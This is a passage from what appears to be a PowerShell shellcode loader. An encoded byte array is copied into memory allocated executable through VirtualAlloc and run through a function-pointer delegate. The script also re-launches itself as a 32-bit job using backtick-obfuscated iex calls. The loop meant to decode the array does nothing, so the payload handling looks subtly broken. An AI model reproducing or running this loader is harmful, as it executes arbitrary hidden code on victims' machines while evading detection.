120,125,101,116,99,17,88,19,116,105,120,101,17,17,117,17,78,78,97,78,78,78,120,127,120,101,116,127,103,17,73,17,78,78,118,116,101,124,112,120,127,112,99,118,98,17,30,16,78,120,127,120,101,101,116,99,124,17,146,17,78,78,98,116,101,100,98,116,99,124,112,101,121,116,99,99,17,17,140,17,78,112,117,123,100,98,101,78,119,117,120,103,17,17,123,17,78,78,97,78,78,114,126,124,124,126,117,116,17,17,126,17,78,78,97,78,78,119,124,126,117,116,17,17,144,17,78,78,98,116,101,78,112,97,97,78,101,104,97,116,17,17,219,17,78,116,105,114,116,97,101,78,121,112,127,117,125,116,99,34,17,17,166,17,78,114,126,127,101,99,126,125,119,97,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,81,17,80,1,81,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,37,34,63,32,34,40,63,32,35,37,63,35,35,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,245,22,17,17,85,116,119,112,100,125,101,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,71,88,65,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,67,98,112,112,102,122,49,100,124,120,96,122,112,102,96,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,70,120,127,117,126,102,98,49,89,116,125,97,49,66,104,98,101,116,124,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,70,120,127,117,126,102,98,49,89,116,125,97,49,66,104,98,101,116,124,49,119,126,99,49,73,34,35,49,102,120,127,117,126,102,98,49,117,116,98,122,101,126,97,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,82,43,77,102,120,127,117,126,102,98,77,98,104,98,101,116,124,34,35,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,94,120,124,124,116,120,63,116,105,116,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,16,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,82,43,77,68,98,116,99,98,77,35,41,36,38,35,77,85,116,98,122,101,126,97,77,65,93,100,118,49,32,63,33,77,125,126,117,116,99,77,82,125,120,116,127,101,66,126,114,122,116,101,63,114,97,97,17,17,82,43,77,68,98,116,99,98,77,35,41,36,38,35,77,85,116,98,122,101,126,97,77,65,93,100,118,49,32,63,33,77,125,126,117,116,99,77,82,125,120,116,127,101,66,126,114,122,116,101,63,114,97,97,17,17,82,43,77,68,98,116,99,98,77,35,41,36,38,35,77,85,116,98,122,101,126,97,77,65,93,100,118,49,32,63,33,77,125,126,117,116,99,77,82,125,120,116,127,101,66,126,114,122,116,101,63,114,97,97,17,17,86,84,69,66,84,67,71,84,67,17,17,17,52,17,80,17,93,17,93,17,68,17,66,17,84,17,67,17,66,17,65,17,67,17,94,17,87,17,88,17,93,17,84,17,52,17,17,17,77,17,83,17,68,17,86,17,17,17,17,17,77,17,115,17,100,17,118,17,63,17,125,17,126,17,118,17,17,17,17,17,52,17,37,17,63,17,37,17,117,17,60,17,52,17,35,17,63,17,35,17,117,17,60,17,52,17,35,17,63,17,35,17,117,17,49,17,52,17,35,17,63,17,35,17,117,17,43,17,52,17,35,17,63,17,35,17,117,17,43,17,52,17,35,17,63,17,35,17,117,17,43,17,49,17,17,17,59,17,17,17,119,120,125,116,43,49,52,98,61,49,125,120,127,116,43,49,52,117,61,49,116,99,99,126,99,43,49,74,52,117,76,52,98,28,27,17,17,17,17,17,17,17,17,17,16,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68,68)

for ($x = 0; $x -lt $acode.Count; $x++) {
	$acode[$x] = $acode[$x]
}

$ava = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$abuffer = $ava.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $abuffer, $acode.length)

$arunme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))
$arunme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) ie`x $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	i`ex $DoIt
}